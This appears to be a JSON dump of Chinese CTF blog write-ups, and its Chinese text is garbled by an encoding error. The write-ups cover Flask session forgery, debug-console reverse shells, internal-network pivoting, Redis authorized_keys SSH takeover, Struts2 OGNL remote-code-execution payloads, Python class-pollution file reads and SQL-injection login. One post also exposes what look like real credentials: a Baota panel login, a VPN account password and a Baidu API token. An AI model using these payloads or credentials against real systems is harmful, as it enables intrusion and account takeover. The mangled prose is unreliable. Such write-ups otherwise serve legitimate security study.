FSCM.decode('eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZO9evg.Xms6P6EytB2HM4UvqW128bZDB-8', key)\n                    # print(res)\n                    if 'user' in str(res):\n                        print(key)\n                        exit()\n```\n\nçˆ†ç ´å‡ºåå››ä½ æˆ–è€…è‡ªå·±è®©gptå†™ä¸€ä¸ªå­—å…¸æ…¢æ…¢è·‘éƒ½è¡Œ\n\nç„¶åä¼ªé€ session å¯ä»¥çœ‹åˆ°æç¤º\n\n```javascript\nä»Šå¤©æµ‹è¯•ç•™è¨€æ¿çš„æ—¶å€™å‘ç°æˆ‘çš„è°ƒè¯•æ¨¡å¼ç»™å‡ºçš„pinç ä¸€ç›´æ˜¯904-474-531ä¸å˜ï¼ŒçœŸæ˜¯å¥‡æ€ªå‘¢\nä¸è¿‡è¿™ä¸ªæ³„éœ²äº†è²Œä¼¼å¾ˆå±é™©ï¼Œåˆ«äººå°±å¯ä»¥è¿›æˆ‘çš„consoleæ‰§è¡Œä»»æ„pythonä»£ç äº†ï¼\nä¸€å®šä¸èƒ½æ³„éœ²å‡ºå»ï¼ï¼ï¼ï¼\n```\n\nç»™äº†æˆ‘ä»¬pingç  å°±å¯ä»¥çŸ¥é“å®ƒå¼€å¯äº†debugæ¨¡å¼\n\nç›´æ¥è®¿é—®`/console`è·¯ç”±\n\nè¿›è¡Œåå¼¹shell\n\nè·å¾—ç¬¬ä¸€æ®µflag å†æŸ¥çœ‹`/readme`å¹¶ä¸”å¾—åˆ°æç¤º\n\n```javascript\næ­å–œä½ é€šè¿‡å¤–ç½‘æ¸—é€æ‹¿ä¸‹äº†æœ¬å°æœåŠ¡å™¨çš„æƒé™\næ¥ä¸‹æ¥ï¼Œä½ éœ€è¦å°è¯•å†…ç½‘æ¸—é€ï¼Œæœ¬æœåŠ¡å™¨çš„/app/toolsç›®å½•ä¸‹å†…ç½®äº†fscan\nä½ éœ€è¦äº†è§£å®ƒçš„åŸºæœ¬ç”¨æ³•ï¼Œç„¶åæ‰«æå†…ç½‘çš„ipæ®µ\nå¦‚æœä½ è¿›è¡Œäº†æ­£ç¡®çš„æ“ä½œï¼Œä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„ç»“æœ\n10.1.11.11:22 open\n10.1.23.21:8080 open\n10.1.23.23:9000 open\nå°†ä½ å¾—åˆ°çš„è‹¥å¹²ä¸ªç«¯å£å·ä»å°åˆ°å¤§æ’åºå¹¶ä»¥ - åˆ†å‰²ï¼Œè¿™ä¸€ä¸²å³ä¸ºhint.zipå‹ç¼©åŒ…çš„å¯†ç ï¼ˆæœ¬ä¾‹ä¸­ï¼Œå¯†ç ä¸ºï¼š22-8080-9000ï¼‰\næ³¨æ„ï¼šè¯·å¿½ç•¥æ‰xx.xx.xx.1ï¼Œä¾‹å¦‚æ‰«å‡ºä¸‰ä¸ªip 192.168.0.1 192.168.0.2 192.168.0.3 ï¼Œè¯·å¿½ç•¥æ‰æœ‰å…³192.168.0.1çš„æ‰€æœ‰ç»“æœï¼æ­¤ä¸ºå‡ºé¢˜äººæœåŠ¡å™¨ä¸Šçš„å…¶å®ƒæ­£å¸¸æœåŠ¡\n```\n\n`ifconfig` å‘½ä»¤æ²¡æœ‰ è¿˜å¯ä»¥ç”¨`hostname -I `è·å–å­˜æ´»çš„ipåœ°å€\n\nå¯ä»¥å¾—åˆ°ä¸¤ç«¯ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693568306191-a3a36e21-6dd5-4b8d-8063-2176d62e53a2.png)\n\nç„¶åè¿›è¡Œfscan æ‰«æcæ®µ\n\nè·å¾—å¯†ç `22-3306-6379-8080` å†å°†å‹ç¼©åŒ…ä¸­flagè§£å‡º è·å¾—æç¤º\n\n```javascript\nå½“ä½ çœ‹åˆ°æ­¤éƒ¨åˆ†ï¼Œè¯æ˜ä½ æ­£ç¡®çš„è¿›è¡Œäº†fscançš„æ“ä½œå¾—åˆ°äº†æ­£ç¡®çš„ç»“æœ\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ¬å†…ç½‘ä¸‹è¿˜æœ‰å¦å¤–ä¸¤å°æœåŠ¡å™¨\nå…¶ä¸­ä¸€å°å¼€å¯äº†22(ssh)å’Œ6379(redis)ç«¯å£\nå¦ä¸€å°å¼€å¯äº†3306(mysql)ç«¯å£\nè¿˜æœ‰ä¸€å°æ­£æ˜¯ä½ è®¿é—®åˆ°çš„ç•™è¨€æ¿æœåŠ¡\næ¥ä¸‹æ¥ï¼Œä½ å¯èƒ½éœ€è¦æ­å»ºä»£ç†ï¼Œä»è€Œä½¿ä½ çš„æœ¬æœºèƒ½ç›´æ¥è®¿é—®åˆ°å†…ç½‘çš„æœåŠ¡å™¨\næ­¤å¤„å¯äº†è§£`nps`å’Œ`frp`ï¼ŒåŒæ ·åœ¨/app/toolså·²å†…ç½®äº†ç›¸åº”æ–‡ä»¶\nè¿æ¥ä»£ç†ï¼Œæ¨è`proxychains`\nå¯¹äºmysqlæœåŠ¡å™¨ï¼Œä½ éœ€è¦æ‰¾åˆ°å…¶è´¦å·å¯†ç å¹¶æˆåŠŸè¿æ¥ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°flag2\nå¯¹äºredisæœåŠ¡å™¨ï¼Œä½ å¯ä»¥å­¦ä¹ å…¶ç›¸å…³çš„æ¸—é€æŠ€å·§ï¼Œä»è€Œè·å–åˆ°redisçš„æƒé™ï¼Œå¹¶è¿›ä¸€æ­¥å¯»æ‰¾å…¶getshellçš„æ–¹å¼ï¼Œæœ€ç»ˆå¾—åˆ°flag3\n```\n\né‚£ä¹ˆæˆ‘ä»¬è¦å»è¿æ¥å®ƒå†…ç½‘ä¸‹çš„å…¶ä»–æœåŠ¡å™¨  æˆ‘ä»¬å°±è¦è¿›è¡Œå†…ç½‘ç©¿é€åšéš§é“\n\né¦–å…ˆå°±æ˜¯ç”¨ä¸€å°vpså»è¿æ¥è·³æ¿æœº ç„¶åé€šè¿‡è·³æ¿æœºåšéš§é“å°†å†…ç½‘ä¸­æœåŠ¡å™¨æš´éœ²åœ¨å…¬ç½‘ä¸­ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨æˆ‘ä»¬çš„ç‰©ç†æœºå»è¿æ¥åˆ°äº†\n\nå¤§è‡´å°±æ˜¯ `172.21.0.2:xxxx(å†…ç½‘æœåŠ¡å™¨)->è·³æ¿æœºip:xxxxx->æˆ‘ä»¬çš„vps<-æŸç§â¼¯å…·è¿æ¥è¿™ä¸ªéš§é“<-æ”»å‡»æœº  `\n\nè¿™é‡Œæˆ‘ç”¨çš„æ˜¯NPS\n\nä¸€å¼€å§‹æˆ‘ç”¨çš„tcpéš§é“ å°±æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥å»è¿æ¥æˆ‘çš„vpså’ŒæŒ‡å®šéš§é“ç«¯å£ç›´æ¥è¿æ¥ä»–çš„å†…ç½‘æœåŠ¡å™¨\n\nä½†æ˜¯è¿™é‡Œæˆ‘å¹¶ä¸èƒ½è¿æ¥æˆåŠŸredis å°±å¾ˆå¥‡æ€ª\n\nä¹‹åæˆ‘ç”¨sockså¹¶ä¸”`proxifier`  åšäº†ä¸ªä»£ç† å°±ä¸ç”¨å»ç”¨æˆ‘çš„vps ipäº† ç›´æ¥å°±æ˜¯`127.0.20.x:3306`å°±å¯ä»¥è¿æ¥åˆ°ä»–çš„å†…ç½‘ä¸­mysqlæœåŠ¡å™¨ \n\né…ç½®ä»€ä¹ˆçš„éƒ½è¦åšå¥½ åŒ…æ‹¬å®¹è®¸èµ°å®ƒçš„éš§é“åº”ç”¨ç­‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693569252355-b48b428a-f041-4125-ab6b-e5c3342fe830.png)\n\nè¿æ¥ä¸Šå»ä¹‹å å¯ä»¥åœ¨è¡¨ä¸­å‘ç°ç¬¬äºŒæ®µflag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693409847033-1ac482a8-1691-48f8-9e01-2d5064da6705.png)\n\nç¬¬ä¸‰æ®µæ˜¯rediså…¬é’¥ç™»å½•æœåŠ¡å™¨ \n\nå¤§è‡´è¿‡ç¨‹ä¸æ¡ä»¶ï¼š\n\n1. å®¢æˆ·ç«¯ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œå°†å…¬é’¥æ‹·è´ç»™æœåŠ¡å™¨ç«¯\n2. å®¢æˆ·ç«¯å‘èµ·ç™»å½•è¯·æ±‚\n3. æœåŠ¡å™¨ç«¯æ ¹æ®å®¢æˆ·ç«¯å‘æ¥çš„ä¿¡æ¯æŸ¥æ‰¾æ˜¯å¦å­˜æœ‰è¯¥å®¢æˆ·ç«¯çš„å…¬é’¥ï¼Œ\n4. å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„åŠ å¯†åçš„æ¶ˆæ¯åä½¿ç”¨ç§é’¥è§£å¯†ï¼Œå¹¶æŠŠè§£å¯†åçš„ç»“æœå‘ç»™æœåŠ¡å™¨ç”¨äºéªŒè¯\n5. æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„è§£å¯†ç»“æœï¼Œä¸è‡ªå·±åˆšæ‰ç”Ÿæˆçš„éšæœºæ•°æ¯”å¯¹\n\n### **æ¡ä»¶ï¼š**\n\n- RedisæœåŠ¡ä½¿ç”¨ROOTè´¦å·å¯åŠ¨\n- æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ã€‚\n\né¦–å…ˆç”¨å·¥å…·è¿æ¥åˆ°redisæœåŠ¡å™¨ åªè¦éš§é“æ­å»ºæ²¡é—®é¢˜éƒ½èƒ½è¿ä¸Š å°±æ˜¯è¿™ä¸ªç¯å¢ƒå¤ªæŠ˜ç£¨äººäº† \n\nä¸è¿‡ä¹Ÿæ²¡åŠæ³• èƒ½ä½“ä¼šåˆ°å‡ºé¢˜äººçš„ä¸€ç‰‡è‹¦å¿ƒ åªæ€ªæ…å±æ£å¤ªå¤šäº† ç´ è´¨å¤ªå·®\n\néœ€è¦æ³¨æ„çš„æ˜¯ipä¼šå‘ç”Ÿå˜åŒ–æ˜¯åŠ¨æ€çš„ è¿æ¥ä¸ä¸Šçš„çš„æ—¶å€™ä¸€å®šè¦å»å†çœ‹çœ‹ è€Œä¸”é¢˜ç›®ç¯å¢ƒä¼šéš”ä¸€æ®µæ—¶é—´é‡å¯\n\n é¦–å…ˆåœ¨è‡ªå·±æ”»å‡»æœºç”³è¯·å…¬ç§é’¥ å°†ç§é’¥ä¿å­˜åœ¨è‡ªå·±ç‰©ç†æœºä¸Š \n\n```javascript\nssh-keygen -t rsa # â½£æˆå…¬é’¥å’Œç§é’¥\nredisæœåŠ¡å™¨å†™å…¥\nset x \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVuidivu8ahaTWtPekYXjkm0ya2rJ9uYFXQ6ca0GO9ny478xL8sU6Qg3Cpzr1/uWGOahpACX2CLjnkRxiZAuxwymqGyq0/jYoLLuGfKCIOdb/WL5mcsdubiVvjC4jWSLIvlwB/rk2LS5DNC2+fnBGuVKDRNLn6BY4w8vRdqowA9/Gy5+gJwBR9TY1J6KQUTc0LXNasQIhBbqXYTQwfcqdhBs929Uq5yOIs+1KawJJrmkWkENvbat7BphjlUhvZUrynEpCNZ0kJVxq2Pj4ltks1WMknE+cES10LJQDSlhjxNuED52QPdcIjqtKUZZk3P7hKwLmO782D3/stPQ0Q4RMWeaUvJLRFLtep1uf+O5YQTtJ8NJzFP+nntNX/NB7HKk4dIy+PnQOh1TaEAAWXK5TR6SgrRttAUcZzhrbTjNNvqRHq9VJplE7hFoaqJXQhD7x7UgjPJqK8kP0b/kpza68+ljgD7PZJSUl7q5gJ5yicGvBUNht/6Y/qqn4KonDpYH8=\\n\"\nconfig set dir /root/.ssh\nconfig set dbfilename authorized_keys\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693570658936-a03a4b9b-acca-46c8-bc6a-a3a5173fff98.png)\n\nç„¶åç”¨ç§é’¥ssh 22ç«¯å£é“¾æ¥å³å¯\n\nç„¶åå°±èƒ½å¾—åˆ°æœ€åä¸€æ®µflag\n\nè¢«ç¯å¢ƒæŠ˜ç£¨ã€‚ã€‚ã€‚\n\næ”¶è·è¿˜æ˜¯é¢‡å¤š å¾ˆå€¼å¾—\n","categories":["å„èµ›äº‹WP"]},{"title":"hwå·¥å…·ç®±","url":"/post/b361a80b.html","content":"\nnothing here\n\n<!--more-->\n\nå¯åˆ©ç”¨çš„è„šæœ¬ä»¥åŠæ•™ç¨‹\n\nhttps://github.com/Ta0ing/captcha-killer-java8 æ’ä»¶\n\nhttps://www.wangan.com/p/7fy7f367c2406ae1  å¯†ç æœ¬\n\nå®å¡”ï¼š\n\nhttps://114.116.119.253:5003/login admin/boogipop158!\n\nVPN\n\n```php\n2277273817@qq.com\nlzwluozhiwen57\n```\n\n\n\nbpéªŒè¯ç æ¥å£é…ç½®:\n\n```php\nPOST /rest/2.0/ocr/v1/accurate?access_token=24.c401e953b9cd40fe15b3c3880787b2db.2592000.1693830979.282335-37231824 HTTP/1.1\nHost: aip.baidubce.com\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nSec-Fetch-Site: none\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 55\n\nimage=<@URLENCODE><@BASE64><@IMG_RAW></@IMG_RAW></@BASE64></@URLENCODE>\n```\n"},{"title":"XCTFç®€å•è®°å½•","url":"/post/85812b61.html","content":"\nwebç‹—æ²¡å•¥å‚ä¸æ„Ÿ\n\n<!--more-->\n\n# WEB\n\nwebå°±ä¸€é“é¢˜ç›® \n\n## jwt2struts\n\nè€ƒç‚¹ï¼š\n\nå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡» jwtä¼ªé€  structs2 s2-016\n\næºç å‘ç°`JWT_key.php`\t \n\nè·å¾—æºç \n\n```php\n<?php\n  highlight_file(__FILE__);\ninclude \"./secret_key.php\";\ninclude \"./salt.php\";\n//$salt = XXXXXXXXXXXXXX // the salt include 14 characters\n//md5($salt.\"adminroot\")=e6ccbf12de9d33ec27a5bcfb6a3293df\n@$username = urldecode($_POST[\"username\"]);\n@$password = urldecode($_POST[\"password\"]);\nif (!empty($_COOKIE[\"digest\"])) {\n  if ($username === \"admin\" && $password != \"root\") {\n    if ($_COOKIE[\"digest\"] === md5($salt.$username.$password)) {\n      die (\"The secret_key is \". $secret_key);\n    }\n    else {\n      die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n    }\n  }\n  else {\n    die (\"no no no\");\n  }\n}\n```\n\nå¤§è‡´æµè§ˆ å°±æ˜¯è¦ä¹ˆæˆ‘ä»¬èƒ½å¾—åˆ°ä»–çš„ç›å€¼ è¦ä¹ˆè¾“å…¥å¯†ç ä¸ºroot ä½†æ˜¯åˆä¸å®¹è®¸æˆ‘ä»¬è¾“å…¥å¯†ç ä¸ºroot\n\næ€»ä¹‹å°±æ˜¯è¦è®©`$_COOKIE[\"digest\"] === md5($salt.$username.$password)`æˆç«‹\n\nç›´æ¥ç”¨hashpumpå‚è€ƒhttps://blog.csdn.net/jblock/article/details/78448143?ops_request_misc=&request_id=&biz_id=102&utm_term=hashpump&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-78448143.nonecase&spm=1018.2226.3001.4187\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690788963635-a551229f-e941-4ec8-a654-cd95298a7d88.png)\n\nå¾—åˆ°ä¹‹åæ‰“å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789103062-9ee0da7c-da07-4285-bdf4-1cb8e0e84fb6.png)\n\nå¾—åˆ°jwtçš„keyä¸º`sk-he00lctf3r`ç„¶åä¼ªé€ ç™»å½•\n\nå‘ç°æºç æç¤º do you know struts2?\n\nå½“ç”¨æˆ·æäº¤ age ä¸ºå­—ç¬¦ä¸²è€Œéæ•´å½¢æ•°å€¼æ—¶ï¼Œåç«¯ç”¨ä»£ç æ‹¼æ¥ \"'\" + value + \"'\" ç„¶åå¯¹å…¶è¿›è¡Œ OGNL è¡¨è¾¾å¼è§£æã€‚è¦æˆåŠŸåˆ©ç”¨ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªé…ç½®äº†ç±»ä¼¼éªŒè¯è§„åˆ™çš„è¡¨å•å­—æ®µä½¿ä¹‹è½¬æ¢å‡ºé”™ï¼Œå€ŸåŠ©ç±»ä¼¼ SQLi æ³¨å…¥å•å¼•å·æ‹¼æ¥çš„æ–¹å¼å³å¯æ³¨å…¥ä»»æ„ OGNL è¡¨è¾¾å¼  \n\nå®˜æ–¹wpæ˜¯åœ¨ageæ³¨å…¥`%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27` ä½†æ˜¯æˆ‘ä¹‹åå¤ç°æ²¡æˆåŠŸ æ²¡æœ‰å›æ˜¾\n\nä½†æ˜¯æˆ‘çš„payloadæ˜¯è¿™æ · å¯èƒ½æ˜¯éé¢„æœŸ æ¥æº https://xz.aliyun.com/t/4603\n\n```\n/admiiiiiiiiiiin/user.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /flag%27%29.getInputStream%28%29%29%7D\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789835158-46956817-70ad-4e98-8494-b82ba94c3915.png)\n\n# Misc\n\n## snippingTools\n\nCVE-2023-28303  \n\næ¯”èµ›çš„æ—¶å€™æ‰¾åˆ°å·¥å…·äº† æ²¡è¯• æˆ‘TMã€‚ã€‚ã€‚ã€‚\n\nhttps://github.com/frankthetank-music/Acropalypse-Multi-Tool ç›´æ¥ç”¨å·¥å…·æ¢­å“ˆæ¢å¤å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787514977-7cf9931f-6f99-436e-9048-ffe0dda8874e.png)\n\n## old language\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787906068-9d4f095e-a3c1-4ec2-887c-e53980fa8cc8.png)\n\nå¤ªç¦»è°±äº†è¿™ä¸ª \n\né¾™è¯­ï¼Œæ¸¸æˆã€Šä¸Šå¤å·è½´Vï¼šå¤©é™…ã€‹ä¸­å‡ºç°çš„è¯­è¨€\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787993320-76273c76-7cba-48e8-a7c2-6f63851b7730.jpeg)\n\n***ctf{GIKRVZY}** \n","categories":["å„èµ›äº‹WP"]},{"title":"DASCTF 2023 & 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ› éƒ¨åˆ†WEBå¤ç°ä¸å­¦ä¹ ","url":"/post/731522c3.html","content":"\nåˆèƒ½å­¦åˆ°å¾ˆå¤šä¸çŸ¥é“çš„çŸ¥è¯† æ»¡è¶³æ„Ÿup up up!\n\n<!--more-->\n\n# EzFlask\n\nè·Ÿæ ‡é¢˜å°±æ˜¯flaskæœ‰å…³çš„ è¿›å…¥é¢˜ç›®ç›´æ¥ç»™äº†æºç \n\n```python\nimport uuid\n\nfrom flask import Flask, request, session\nfrom secret import black_list\nimport json\n\napp = Flask(__name__)\napp.secret_key = str(uuid.uuid4())\n\ndef check(data):\n    for i in black_list:\n        if i in data:\n            return False\n    return True\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\nclass user():\n    def __init__(self):\n        self.username = \"\"\n        self.password = \"\"\n        pass\n    def check(self, data):\n        if self.username == data['username'] and self.password == data['password']:\n            return True\n        return False\n\nUsers = []\n\n@app.route('/register',methods=['POST'])\ndef register():\n    if request.data:\n        try:\n            if not check(request.data):\n                return \"Register Failed\"\n            data = json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"Register Failed\"\n            User = user()\n            merge(data, User)\n            Users.append(User)\n        except Exception:\n            return \"Register Failed\"\n        return \"Register Success\"\n    else:\n        return \"Register Failed\"\n\n@app.route('/login',methods=['POST'])\ndef login():\n    if request.data:\n        try:\n            data = json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"Login Failed\"\n            for user in Users:\n                if user.check(data):\n                    session[\"username\"] = data[\"username\"]\n                    return \"Login Success\"\n        except Exception:\n            return \"Login Failed\"\n    return \"Login Failed\"\n\n@app.route('/',methods=['GET'])\ndef index():\n    return open(__file__, \"r\").read()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5010)\n```\n\nå¤§è‡´çœ‹ä¸€çœ¼ ç»å…¸çš„pythonåŸå‹é“¾æ±¡æŸ“ å½“æ—¶åšçš„æ—¶å€™ä¹ŸæˆåŠŸç™»å½•äº† \n\nä½†æ˜¯æˆ‘ä¸çŸ¥é“æ±¡æŸ“å“ªé‡Œè¿™ä¸ªé¢˜ç›® åº”è¯¥æ˜¯æˆ‘æ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹\n\n## é¢„æœŸè§£ï¼š\n\nå…¶å®æœ€é‡è¦çš„ä¸€éƒ¨åˆ†æˆ‘åè€Œæ²¡æœ‰çœ‹åˆ° qwq \n\n```python\n@app.route('/',methods=['GET'])\ndef index():\n    return open(__file__, \"r\").read()\n```\n\n`__file__`ï¼šå½“å‰è„šæœ¬è¿è¡Œçš„è·¯å¾„ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690183448142-533651ff-d59d-4e33-bf8a-4321a2d79b19.png)\n\nè¿™é‡Œæˆ‘ä»¬å¦‚æœèƒ½æ±¡æŸ“__file__å€¼ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶äº†\n\nè¿˜æœ‰å°±æ˜¯è¿™é¢˜å¼€äº†pin è€Œä¸”è¿˜æœ‰ä¸ª`/console`è·¯ç”± è¿™æ˜¯å’‹å‘ç°çš„çœŸç¦»è°±\n\nç„¶åæ˜¯é»‘åå•wafäº†`__init__`\n\nåœ¨check()ä¹‹åæ˜¯è¿›è¡Œäº†ä¸€æ¬¡json.loadsçš„ï¼Œè€Œjsonè¯†åˆ«unicode  æ‰€ä»¥å¯ä»¥ç”¨unicodeç¼–ç è¿›è¡Œbypass\n\né¢„æœŸè§£å°±æ˜¯åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–ç„¶åè®¡ç®—pinç  å°±å¯ä»¥getshelläº†\n\nè¿™é‡Œå°±ä¸èµ˜è¿°äº†\n\n## éé¢„æœŸ\n\nçœŸæ­£å­¦ä¹ çš„æ˜¯éé¢„æœŸ\n\nè¿™é‡Œæœ‰ä¸¤ç§payload:\n\n### ç¬¬ä¸€ç§ï¼šæ±¡æŸ“__file__ä»»æ„æ–‡ä»¶è¯»å–\n\nå‰é¢ä¹Ÿè¯´è¿‡åŸç†äº† åªè¦æˆ‘ä»¬å°†__file__æ±¡æŸ“ä¸ºæˆ‘ä»¬æƒ³è¯»å–çš„æ–‡ä»¶åå³å¯\n\nç›´æ¥è¯»ç¯å¢ƒå˜é‡\n\n```python\n{\"username\":\"1\",\"password\":\"1\",\"\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\":{\"__globals__\":{\"__file__\":\"/proc/self/environ\"}}}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184393793-d0a681ee-d952-4ce1-a399-3b4569f5cfef.png)\n\nç„¶åè®¿é—®`/proc/1/environ` å‡ºé¢˜äººç¯å¢ƒå˜é‡ä¸­çš„flagå¿˜åˆ äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184461558-65c4f6b7-4253-4e53-8b18-fb8274dba2d4.png)\n\n### ç¬¬äºŒç§: æ±¡æŸ“ _static_folder  è·¯å¾„ç©¿è¶Š\n\né¦–å…ˆæ¥çœ‹çœ‹` _static_folder` \n\nflask initæ–‡ä»¶éƒ¨åˆ†ä»£ç \n\n```python\ndef __init__(\n        self,\n        import_name,\n        static_url_path=None,\n        static_folder='static',\n        static_host=None,\n        host_matching=False,\n        subdomain_matching=False,\n        template_folder='templates',\n        instance_path=None,\n        instance_relative_config=False,\n        root_path=None\n    ):\n```\n\nå¯ä»¥çœ‹åˆ°`static_folder='static'` é»˜è®¤æ˜¯åœ¨staticæ–‡ä»¶ä¹Ÿå³æ˜¯é»˜è®¤çš„é™æ€æ–‡ä»¶çš„ä½ç½®  \n\næˆ‘çš„ç†è§£æ˜¯ æˆ‘ä»¬`static_folder`å¯ä»¥æŒ‡å®šé™æ€æ–‡ä»¶çš„ä½ç½® å¹¶ä¸”æˆ‘ä»¬å¯ä»¥è®¿é—® ä¸€èˆ¬æˆ‘ä»¬åšé¢˜éƒ½æœ‰æ³¨æ„åˆ°æˆ‘ä»¬å¯ä»¥è®¿é—®staticç›®å½• \n\né‚£ä¹ˆ å¦‚æœæˆ‘ä»¬æ±¡æŸ“`_static_folder`è®©ä»–çš„è·¯å¾„ä¸º`/` é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶äº† \n\nå› æ­¤æˆ‘ä»¬å°±å¯ä»¥è·¯å¾„ç©¿è¶Šäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690185307308-a0208406-53ea-4081-b105-873fc05a2830.png)\n\næ³¨æ„ä¸€ä¸‹è·¯å¾„`/static/proc/1/environ`\n\n# MyPicDisk\n\nè¿™é“é¢˜ç›® å¦‚ä½•ä¸Šä¼ æ–‡ä»¶çš„åŒæ—¶å¹¶ä¸”postæ•°æ® æˆ‘å°¬ä½äº† ä¸å¤ªä¼š é¢é¢é¢ æŠ½è±¡\n\nç„¶åèµ›åçœ‹äº†å¸ˆå‚…ä»¬çš„wp çœŸçš„å¤ªå¼ºè¾£\n\né¦–å…ˆç”¨æˆ·åå­˜åœ¨ä¸‡èƒ½é’¥åŒ™ç™»å½• `admin' or 1=1#` å°±å¯ä»¥ç™»å½•äº† \n\nç„¶åå­˜åœ¨æºç æ³„éœ²`/y0u_cant_find_1t.zip`\n\n```php\n<?php\n  session_start();\nerror_reporting(0);\nclass FILE{\n  public $filename;\n  public $lasttime;\n  public $size;\n  public function __construct($filename){\n    if (preg_match(\"/\\//i\", $filename)){\n      throw new Error(\"hacker!\");\n    }\n    $num = substr_count($filename, \".\");\n    if ($num != 1){\n      throw new Error(\"hacker!\");\n    }\n    if (!is_file($filename)){\n      throw new Error(\"???\");\n    }\n    $this->filename = $filename;\n    $this->size = filesize($filename);\n    $this->lasttime = filemtime($filename);\n  }\n  public function remove(){\n    unlink($this->filename);\n  }\n  public function show()\n  {\n    echo \"Filename: \". $this->filename. \"  Last Modified Time: \".$this->lasttime. \"  Filesize: \".$this->size.\"<br>\";\n  }\n  public function __destruct(){\n    system(\"ls -all \".$this->filename);\n  }\n}\n?>\n\n\n\n\n\n<?php\nif (!isset($_SESSION['user'])){\n}\nelse{\n  if ($_SESSION['user'] !== 'admin') {\n    echo \"<script>alert('you are not admin!!!!!');</script>\";\n    unset($_SESSION['user']);\n    echo \"<script>location.href='/index.php';</script>\";\n  }\n  echo \"<!-- /y0u_cant_find_1t.zip -->\";\n  if (!$_GET['file']) {\n    foreach (scandir(\".\") as $filename) {\n      if (preg_match(\"/.(jpg|jpeg|gif|png|bmp)$/i\", $filename)) {\n        echo \"<a href='index.php/?file=\" . $filename . \"'>\" . $filename . \"</a><br>\";\n      }\n    }\n    echo '\n<form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\né€‰æ‹©å›¾ç‰‡ï¼š<input type=\"file\" name=\"file\" id=\"\">\n<input type=\"submit\" value=\"ä¸Šä¼ \"></form>\n';\n    if ($_FILES['file']) {\n      $filename = $_FILES['file']['name'];\n      if (!preg_match(\"/.(jpg|jpeg|gif|png|bmp)$/i\", $filename)) {\n        die(\"hacker!\");\n      